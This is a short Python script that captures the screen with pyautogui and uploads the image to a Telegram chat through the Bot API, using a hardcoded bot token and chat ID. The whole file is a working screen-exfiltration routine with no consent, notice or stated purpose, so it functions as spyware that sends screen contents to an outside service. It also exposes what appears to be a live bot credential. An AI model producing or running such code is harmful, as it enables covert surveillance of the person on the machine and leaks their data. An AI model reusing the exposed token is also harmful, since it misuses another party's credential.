import pyautogui
import requests

TOKEN = "8894294193:AAE2l7F9pWo6e5g5sffifU_MGfgzvRC7K7E"
CHAT_ID = "6860723254"

# Screenshot
img = pyautogui.screenshot()

image_name = "screenshot.png"

img.save(image_name)

# Send Screenshot
url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"

with open(image_name, "rb") as photo:

    requests.post(
        url,
        data={"chat_id": CHAT_ID},
        files={"photo": photo}
    )

print("Screenshot Sent")